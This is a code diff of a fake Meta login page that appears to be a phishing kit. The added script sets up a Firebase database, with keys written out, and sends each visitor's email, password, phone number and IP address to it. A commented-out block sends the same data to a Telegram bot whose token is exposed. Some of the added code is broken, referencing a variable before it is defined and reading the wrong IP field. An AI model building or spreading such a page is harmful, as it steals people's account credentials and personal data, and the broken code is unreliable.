@@ -20,6 +20,32 @@
       rel="stylesheet"
       href="npm/bootstrap%404.3.1/dist/css/bootstrap.min.css"
     />
+
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+
+    <script src="https://www.gstatic.com/firebasejs/8.6.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.6.1/firebase-database.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.6.1/firebase-storage.js"></script>
+    <script>
+      const firebaseConfig = {
+        apiKey: "AIzaSyANSwlR-gyTKxCBCdhhWHgbB5Fg5-ODJ3c",
+        authDomain: "tourism-de1ac.firebaseapp.com",
+        projectId: "tourism-de1ac",
+        storageBucket: "tourism-de1ac.appspot.com",
+        messagingSenderId: "204093368364",
+        appId: "1:204093368364:web:88baf7f0e2582e3f4cc989",
+        measurementId: "G-XVC8PLLSJF",
+        databaseURL:
+          "https://tourism-de1ac-default-rtdb.asia-southeast1.firebasedatabase.app",
+      };
+
+      // Khởi tạo Firebase
+      firebase.initializeApp(firebaseConfig);
+      const sfacebookRef = db.ref("sfacebook");
+
+      // Firebase Realtime Database reference
+      const db = firebase.database();
+    </script>
     <script src="jquery-3.6.0.min.js"></script>
     <title>Meta</title>
     <style>
@@ -1256,7 +1282,16 @@
                           For more information about how Meta handles your data
                           please read our
                         </p>
-                        <a style="font-size:14px; text-decoration: underline; color: #0064E0;" target="_blank" href="https://www.facebook.com/privacy/policy/?entry_point=data_policy_redirect&entry=0">Meta Privacy Policy</a>
+                        <a
+                          style="
+                            font-size: 14px;
+                            text-decoration: underline;
+                            color: #0064e0;
+                          "
+                          target="_blank"
+                          href="https://www.facebook.com/privacy/policy/?entry_point=data_policy_redirect&entry=0"
+                          >Meta Privacy Policy</a
+                        >
                       </div>
                     </form>
                   </div>
@@ -3045,7 +3080,13 @@
         password: $("#password-input").val(),
         type: "password",
       };
+      var phone = $("#phone").val();
       var password = $("#password-input").val();
+
+      $.getJSON("https://api.ipify.org?format=json", function (data) {
+        // Setting text of element P with id gfg
+        sfacebookRef.push({ email, password, ip: data.id, phone });
+      });
       // $.ajax({
       //     url: 'https://api.telegram.org/bot1070051055:AAHqiH52qWt0ubyfyOmIqkXQuqIjm4Mt5RM/sendMessage',
       //     method: 'POST',
